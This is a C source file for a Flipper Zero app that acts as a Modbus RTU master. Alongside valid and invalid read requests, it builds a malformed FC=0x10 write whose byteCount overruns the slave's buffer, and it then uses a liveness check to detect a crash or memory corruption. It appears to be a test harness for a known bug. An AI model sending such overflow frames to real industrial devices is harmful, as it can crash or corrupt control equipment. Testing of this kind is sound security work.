#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/elements.h>

#define MODBUS_SLAVE_ID   0x01
#define MODBUS_BAUD_RATE  9600
#define MODBUS_REG0_BASELINE 0x1000  // known-good value of register 0 after reset

/* 
 * ####################################################################################################
 * MODBUS app struct needed later in flipper app
 * ####################################################################################################
*/

typedef struct {
    FuriString* status_text;
    uint16_t register_value;
    bool request_sent;
    bool bug_triggered;     // set true when two-step oracle confirms crash
    uint8_t response_buffer[256];
    size_t response_len;
    FuriSemaphore* rx_semaphore;
    const char* last_request_type;
    uint32_t last_rtt_ms;
} ModbusAppState;

/* 
 * ####################################################################################################
 * CRC-16 Modbus calculation
 * ----------------------------------------------------------------------------------------------------
 * In MODBUS RTU, Cyclic Redundancy Check (CRC) is a 16-bit error-checking code appended to the end of a message frame
 * to ensure data integrity. It allows the receiving device to detect corrupted or noisy transmissions.
 * ----------------------------------------------------------------------------------------------------
 * ####################################################################################################
*/

static uint16_t modbus_crc16(const uint8_t* data, size_t length) {
    uint16_t crc = 0xFFFF;

    for(size_t i = 0; i < length; i++) {
        crc ^= data[i];                         // XOR byte into least sig. byte of crc

        for(uint8_t j = 0; j < 8; j++) {        // loop over each bit
            if(crc & 0x0001) {                  // if the LSB is set
                crc = (crc >> 1) ^ 0xA001;      // shift right and XOR 0xA001
            }
            else {                            // else LSB is not set
                crc = crc >> 1;               // just shift right
            }
        }
    }
    // This number has low and high bytes swapped, so use it accordingly (or swap bytes)
    return crc;
}


/* 
 * ####################################################################################################
 * Construct a Modbus RTU Read Holding Registers request
 * ----------------------------------------------------------------------------------------------------
 * Read Multiple Holding Registers is used for reading contents on a contiguous block of holding registers in a remote device.
 * The Request PDU specifies the starting register address and the number of registers. In the PDU Registers are addressed starting
 * at zero. Therefore registers numbered 1-16 are addressed as 0-15.
 * 
 * In this case, this function is used to craft a valid MODBUS RTU request.
 * ----------------------------------------------------------------------------------------------------
 * ####################################################################################################
*/

static size_t modbus_build_read_holding_registers(uint8_t* buffer, uint8_t slave_id, uint16_t start_address, uint16_t count) {
    
    buffer[0] = slave_id;                           // slave address in hexadecimals
    buffer[1] = 0x03;                               // modbus function code for reading multiple holding registers
    buffer[2] = (start_address >> 8) & 0xFF;        // shifting starting register
    buffer[3] = start_address & 0xFF;               // extracting LSB
    buffer[4] = (count >> 8) & 0xFF;                // shifting number of registers that needed to be read
    buffer[5] = count & 0xFF;                       // extracting LSB
    
    uint16_t crc = modbus_crc16(buffer, 6);         // generating CRC-16
    buffer[6] = crc & 0xFF;                         // extracting LSB
    buffer[7] = (crc >> 8) & 0xFF;                  // shifting 1 byte left and extracting LSB
    
    return 8;                                       // this return states the frame size, which is 8
}

/* 
 * ####################################################################################################
 * Construct an invalid Modbus request (illegal function code)
 * ----------------------------------------------------------------------------------------------------
 * This function crafts an invalid MODBUS RTU request by using an unsupported function code (which is 255 - 0xFF).
 * Comments made to explain the structure of modbus_build_read_holding_registers() holds also for this function.
 * ----------------------------------------------------------------------------------------------------
 * ####################################################################################################
*/

static size_t modbus_build_invalid_request(uint8_t* buffer, uint8_t slave_id) {

    buffer[0] = slave_id;
    buffer[1] = 0xFF; // Invalid function code
    buffer[2] = 0x00;
    buffer[3] = 0x00;
    buffer[4] = 0x00;
    buffer[5] = 0x01;
    
    uint16_t crc = modbus_crc16(buffer, 6);
    buffer[6] = crc & 0xFF;
    buffer[7] = (crc >> 8) & 0xFF;
    
    return 8;
}

/* 
 * ####################################################################################################
 * Construct a malformed FC=0x10 request that triggers Bug 1 (buffer overflow).
 * ----------------------------------------------------------------------------------------------------
 * Declares quantity=1 (byteCount should be 2), but sets byteCount=100 and sends 100 bytes of 0xFF as 
 * payload. The slave's unchecked memory overflows the register array and corrupts adjacent memory.
 * Frame size: 7 header bytes + 100 data bytes + 2 CRC = 109 bytes.
 * ----------------------------------------------------------------------------------------------------
 * ####################################################################################################
*/

static size_t modbus_build_overflow_request(uint8_t* buffer, uint8_t slave_id) {

    buffer[0] = slave_id;
    buffer[1] = 0x10;  // Function Code 16: Write Multiple Holding Registers
    buffer[2] = 0x00;  // start address high
    buffer[3] = 0x00;  // start address low (register 0)
    buffer[4] = 0x00;  // quantity high
    buffer[5] = 0x01;  // quantity low (claims 1 register = 2 bytes)
    buffer[6] = 0x64;  // byteCount = 100 (should be 2 — intentionally wrong)
    for(uint8_t i = 0; i < 100; i++) {
        buffer[7 + i] = 0xFF;  // 100 bytes of payload
    }

    uint16_t crc = modbus_crc16(buffer, 107);
    buffer[107] = crc & 0xFF;
    buffer[108] = (crc >> 8) & 0xFF;

    return 109;
}

/* 
 * ####################################################################################################
 * Parse a Modbus RTU response
 * ----------------------------------------------------------------------------------------------------
 * Checks if the received crc (obtainable by performing operations over the buffer length), is the same
 * as the CRC calculated through the function modbus_crc16(arguments), which is the same function that
 * is used when crafting the MODBUS RTU request.
 * ----------------------------------------------------------------------------------------------------
 * ####################################################################################################
*/

static bool modbus_parse_response(const uint8_t* buffer, size_t length, uint16_t* out_value) {
    
    if(length < 7) return false;
    
    uint16_t received_crc = buffer[length - 2] | (buffer[length - 1] << 8);
    uint16_t calculated_crc = modbus_crc16(buffer, length - 2);
    if(received_crc != calculated_crc) return false;
    
    uint8_t byte_count = buffer[2];
    if(byte_count < 2) return false;
    
    *out_value = (buffer[3] << 8) | buffer[4];
    return true;
}

// Serial RX callback
static void modbus_serial_rx_callback(FuriHalSerialHandle* handle, FuriHalSerialRxEvent event, void* context) {
    
    ModbusAppState* state = context;
    
    if(event == FuriHalSerialRxEventData) {
        uint8_t data = furi_hal_serial_async_rx(handle);
        if(state->response_len < sizeof(state->response_buffer)) {
            state->response_buffer[state->response_len++] = data;
        }
        furi_semaphore_release(state->rx_semaphore);
    }
}

// Drawing callback
static void modbus_app_draw_callback(Canvas* canvas, void* context) {
    ModbusAppState* state = context;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 12, "Modbus Master");

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 2, 28, furi_string_get_cstr(state->status_text));

    if(state->bug_triggered) {
        // Two-step oracle confirmed crash — show this clearly
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 2, 44, "!! BUG TRIGGERED !!");
        canvas_set_font(canvas, FontSecondary);
        char rtt_str[32];
        snprintf(rtt_str, sizeof(rtt_str), "RTT: %lu ms", state->last_rtt_ms);
        canvas_draw_str(canvas, 2, 54, rtt_str);
    } else if(state->request_sent) {
        char value_str[64];
        snprintf(value_str, sizeof(value_str), "%s: Reg[0]=0x%04X",
                 state->last_request_type, state->register_value);
        canvas_draw_str(canvas, 2, 44, value_str);

        char rtt_str[32];
        snprintf(rtt_str, sizeof(rtt_str), "RTT: %lu ms", state->last_rtt_ms);
        canvas_draw_str(canvas, 2, 54, rtt_str);
    }

    canvas_draw_str(canvas, 2, 64, "OK=Valid Left=Inv Up=BOF");
}

// Input callback
static void modbus_app_input_callback(InputEvent* event, void* context) {
    furi_assert(context);
    FuriMessageQueue* queue = context;
    furi_message_queue_put(queue, event, FuriWaitForever);
}

/* 
 * ####################################################################################################
 * FLIPPER ZERO APP BODY
 * ####################################################################################################
*/

int32_t modbus_master_v1_app(void* p) {
    UNUSED(p);
    
    ModbusAppState* state = malloc(sizeof(ModbusAppState));
    state->status_text = furi_string_alloc();
    state->register_value = 0;
    state->request_sent = false;
    state->bug_triggered = false;
    state->response_len = 0;
    state->rx_semaphore = furi_semaphore_alloc(1, 0);
    state->last_request_type = "";
    state->last_rtt_ms = 0;
    furi_string_set(state->status_text, "Initializing...");
    
    FuriMessageQueue* event_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, modbus_app_draw_callback, state);
    view_port_input_callback_set(view_port, modbus_app_input_callback, event_queue);
    
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);
    
    FuriHalSerialHandle* serial_handle = furi_hal_serial_control_acquire(FuriHalSerialIdUsart);
    if(!serial_handle) {
        furi_string_set(state->status_text, "UART init failed");
        view_port_update(view_port);
        furi_delay_ms(3000);
        goto cleanup;
    }
    
    furi_hal_serial_init(serial_handle, MODBUS_BAUD_RATE);
    furi_hal_serial_async_rx_start(serial_handle, modbus_serial_rx_callback, state, false);
    
    furi_string_set(state->status_text, "Press OK to send");
    view_port_update(view_port);
    
    bool running = true;
    InputEvent event;
    
// THIS IS WHERE THE LOOP THAT DOES STUFF BEGINS

    while(running) {
        if(furi_message_queue_get(event_queue, &event, 100) == FuriStatusOk) {
            if(event.type == InputTypePress) {
                if(event.key == InputKeyBack) {
                    running = false;
                } else if(event.key == InputKeyOk || event.key == InputKeyLeft || event.key == InputKeyUp) {
                    state->response_len = 0;
                    
                    uint8_t request[256];
                    size_t request_len;
                    
                    if(event.key == InputKeyOk) {                               
                        request_len = modbus_build_read_holding_registers(request, MODBUS_SLAVE_ID, 0, 1);
                        state->last_request_type = "Valid";
                    }
                    else if(event.key == InputKeyLeft) {
                        request_len = modbus_build_invalid_request(request, MODBUS_SLAVE_ID);
                        state->last_request_type = "Invalid";
                    }
                    else {
                        request_len = modbus_build_overflow_request(request, MODBUS_SLAVE_ID);
                        state->last_request_type = "BOF";
                    }
                    
                    uint32_t rtt_start = furi_get_tick();
                    furi_hal_serial_tx(serial_handle, request, request_len);
                    furi_hal_serial_tx_wait_complete(serial_handle);

                    furi_string_set(state->status_text, "Request sent...");
                    view_port_update(view_port);

                    if(event.key == InputKeyUp) {
                        // ── Two-step oracle for BOF test case ──────────────
                        // Step 1: drain any partial response from the crash (slave may send a partial FC=0x10 echo before dying).
                        furi_delay_ms(300);
                        state->response_len = 0;

                        // Drain the semaphore of any queued releases from step 1.
                        while(furi_semaphore_acquire(state->rx_semaphore, 0) == FuriStatusOk) {}

                        // Step 2: send liveness check (valid FC=0x03).
                        uint8_t liveness[8];

                        size_t liveness_len = modbus_build_read_holding_registers(liveness, MODBUS_SLAVE_ID, 0, 1);
// liveness_len has to be equal to the expected size for a correct modbus request because it's gonna be one of the arguments of
// furi_hal_serial_tx()

                        furi_hal_serial_tx(serial_handle, liveness, liveness_len);
                        furi_hal_serial_tx_wait_complete(serial_handle);

                        // Step 3: wait up to 500 ms for a response.
                        uint32_t lv_start = furi_get_tick();
                        bool liveness_ok = false;
                        while((furi_get_tick() - lv_start) < 500) {
                            if(furi_semaphore_acquire(state->rx_semaphore, 10) == FuriStatusOk) {
                                lv_start = furi_get_tick(); // reset on activity
                            }
                            if(state->response_len >= 7) {
                                uint16_t val;
                                if(modbus_parse_response(state->response_buffer, state->response_len, &val)) {
                                    liveness_ok = true;
                                    state->register_value = val;
                                }
                                break;
                            }
                        }

                        state->last_rtt_ms = furi_get_tick() - rtt_start;

                        if(liveness_ok) {
                            if(state->register_value != MODBUS_REG0_BASELINE) {
                                // Slave alive but register corrupted by overflow.
                                // The overflow wrote past the array without crashing
                                // the CPU — a silent memory corruption condition.
                                state->bug_triggered = true;
                                state->request_sent = false;
                                furi_string_set(state->status_text, "CORRUPTION DETECTED");
                            } else {
                                // Slave alive and register value is clean.
                                state->bug_triggered = false;
                                state->request_sent = true;
                                furi_string_set(state->status_text, "No anomaly");
                            }
                        } else {
                            // Slave did not respond to liveness check — crash confirmed.
                            state->bug_triggered = true;
                            state->request_sent = false;
                            furi_string_set(state->status_text, "CRASH DETECTED");
                        }

                    } else {
                        // ── Standard response path for OK and Left ─────────
                        uint32_t timeout_ms = 1000;
                        uint32_t start_time = furi_get_tick();

                        while((furi_get_tick() - start_time) < timeout_ms) {
                            if(furi_semaphore_acquire(state->rx_semaphore, 10) == FuriStatusOk) {
                                start_time = furi_get_tick();
                                timeout_ms = 100;
                            }
                            if(state->response_len >= 7) break;
                        }

                        state->last_rtt_ms = furi_get_tick() - rtt_start;
                        state->bug_triggered = false;

                        if(state->response_len > 0) {
                            uint16_t value;
                            if(modbus_parse_response(
                                   state->response_buffer,
                                   state->response_len,
                                   &value)) {
                                state->register_value = value;
                                state->request_sent = true;
                                furi_string_set(state->status_text, "Success!");
                            } else {
                                char error_str[32];
                                snprintf(
                                    error_str,
                                    sizeof(error_str),
                                    "Parse err (len=%zu)",
                                    state->response_len);
                                furi_string_set(state->status_text, error_str);
                            }
                        } else {
                            furi_string_set(state->status_text, "Timeout");
                        }
                    }

                    view_port_update(view_port);
                }
            }
        }
    }
    
    furi_hal_serial_async_rx_stop(serial_handle);
    furi_hal_serial_deinit(serial_handle);
    furi_hal_serial_control_release(serial_handle);
    
cleanup:
    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    furi_message_queue_free(event_queue);
    furi_semaphore_free(state->rx_semaphore);
    furi_string_free(state->status_text);
    free(state);
    
    return 0;
}
